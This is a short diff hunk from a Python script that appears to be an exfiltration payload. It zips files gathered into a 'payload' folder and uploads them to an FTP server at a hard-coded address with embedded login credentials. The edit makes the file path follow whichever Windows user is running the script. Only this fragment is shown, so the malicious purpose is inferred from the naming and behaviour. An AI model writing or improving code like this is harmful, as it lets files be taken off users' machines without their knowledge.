@@ -134,7 +134,7 @@ try:
                 ftp= ftplib.FTP('192.168.178.111')           # IP from FTP Server!
                 ftp.login('ftpuser', 'vbox')                # username and password from the ftp server!
                 ftp.cwd('/files/')                          # Path from the ftp user pwd!
-                uploadfile= open('C:\\Users\\Windows\\payload\\payload_files\\files.zip', 'rb') 
+                uploadfile= open('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files.zip', 'rb') 
                 ftp.storbinary('STOR ' + filename, uploadfile)
                 ftp.close()
                 uploadfile.close()
